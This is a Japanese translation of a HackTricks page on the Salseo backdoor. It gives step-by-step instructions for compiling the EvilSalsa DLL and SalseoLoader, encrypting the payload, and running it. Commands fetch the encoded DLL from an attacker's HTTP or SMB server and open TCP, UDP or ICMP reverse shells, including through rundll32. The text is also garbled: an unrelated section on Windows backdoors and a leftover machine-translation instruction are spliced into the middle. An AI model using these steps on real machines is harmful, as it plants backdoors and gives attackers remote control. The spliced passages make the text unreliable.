# サルセオ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSレッドチームエキスパート)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## バイナリのコンパイル

githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**がインストールされている必要があります。

これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルします）。

**Visual Studio**の左側の**"Build"タブ**で**"Platform Target"**を選択して、**アーキテクチャを選択**できます。

（**このオプションが見つからない場合は、"Project Tab"**を押してから**"\<Project Name> Properties"**を押してください）

![](<../.gitbook/assets/image (132).png>)

次に、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## バックドアの準備

まず、**EvilSalsa.dll**をエンコードする必要があります。これを行うには、pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルすることができます：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

(Translation not required for the title)

Windowsには、さまざまなバックドアが存在します。これらは、リモートアクセスを取得したり、将来のアクセスを確保したりするために使用されます。以下に、いくつかの一般的なテクニックを紹介します。

#### Sticky Keys Exploit

Sticky Keysは、Windowsのアクセシビリティ機能です。この機能を悪用して、ログイン画面でコマンドプロンプトを開くことができます。これにより、システムにアクセスし、さまざまなコマンドを実行することが可能になります。

#### Utilman Exploit

Utilmanは、Windowsのアクセシビリティ機能の一つです。この機能を悪用すると、ログイン画面でコマンドプロンプトを開くことができます。Sticky Keys Exploitと同様に、システムにアクセスし、コマンドを実行することができます。

#### RDP Backdoor

RDP（Remote Desktop Protocol）は、リモートデスクトップ接続を提供するWindowsの機能です。RDPバックドアを設定することで、攻撃者はリモートからシステムにアクセスできます。

#### Service Backdoor

Windowsサービスを悪用してバックドアを作成することができます。サービスは、システム起動時に自動的に実行されるため、攻撃者はシステムに永続的なアクセスを持つことができます。

#### Registry Backdoor

レジストリは、Windowsの設定とオプションを格納するデータベースです。レジストリを変更してバックドアを作成することができます。これにより、攻撃者はシステムの設定を変更したり、プログラムを自動的に実行したりすることができます。

#### Scheduled Tasks

スケジュールされたタスクを使用して、特定の時間にプログラムやスクリプトを自動的に実行することができます。これを悪用することで、攻撃者は定期的にシステムにアクセスすることができます。

#### PowerShell Backdoor

PowerShellは、Windowsの強力なスクリプティングツールです。PowerShellスクリプトを使用してバックドアを作成することができます。これにより、攻撃者はシステム上で複雑な操作を自動化することができます。

これらのテクニックは、pentestingやセキュリティリサーチにおいて重要です。しかし、不正な目的で使用することは違法であり、倫理的にも許されません。常に合法的な範囲内で活動し、許可を得たテストのみを行うようにしてください。
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
## **バックドアの実行**

### **TCPリバースシェルの取得（HTTPを通じてエンコードされたdllをダウンロードする）**

ncをリバースシェルリスナーとして、そしてエンコードされたevilsalsaを提供するHTTPサーバーとして起動することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルの取得（SMB経由でエンコードされたdllのダウンロード）**

リバースシェルリスナーとしてncを開始し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないでください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルの取得（エンコードされたdllはすでに被害者の内部にあります）**

**この時、リバースシェルを受信するためにクライアントに特別なツールが必要です。ダウンロード：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答の無効化：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントを実行する：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 被害者の内部で、salseoを実行しましょう：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoaderをDLLとしてコンパイルし、main関数をエクスポートする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### main関数の前に追加: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### このプロジェクトにDllExportをインストールする

#### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExportパッケージを検索（Browseタブを使用）、インストールを押す（ポップアップを受け入れる）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)

プロジェクトフォルダには、**DllExport.bat** と **DllExport\_Configure.bat** が表示されます。

### **DllExportをアンインストールする**

**アンインストール**を押します（変ですが、信じてください、これが必要です）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Visual Studioを終了し、DllExport\_configureを実行する**

Visual Studioを**終了**します。

次に、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat**を**実行**します。

**x64**を選択します（x64ボックス内で使用する場合、それが私の場合でした）、**System.Runtime.InteropServices**を選択します（**DllExportのためのNamespace**内で）そして**適用**を押します。

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **プロジェクトを再びVisual Studioで開く**

**\[DllExport]**はもはやエラーとしてマークされるべきではありません。

![](<../.gitbook/assets/image (8) (1).png>)

### ソリューションをビルドする

**出力タイプ = クラスライブラリ**を選択します（プロジェクト --> SalseoLoaderプロパティ --> アプリケーション --> 出力タイプ = クラスライブラリ）

![](<../.gitbook/assets/image (10) (1).png>)

**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderプロパティ --> ビルド --> プラットフォームターゲット = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

ソリューションを**ビルド**するには：ビルド --> ソリューションのビルド（出力コンソール内に新しいDLLのパスが表示されます）

### 生成されたDllをテストする

Dllをテストしたい場所にコピーして貼り付けます。

実行：
```
rundll32.exe SalseoLoader.dll,main
```
以下は、ハッキング技術についてのハッキングの本の内容です。ファイル backdoors/salseo.md からの関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンとhtmlの構文を保ったまま翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。

エラーが表示されなければ、機能するDLLを持っている可能性が高いです！！

## DLLを使用してシェルを取得する

**HTTP** **サーバー**を使用し、**nc** **リスナー**を設定することを忘れないでください

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>
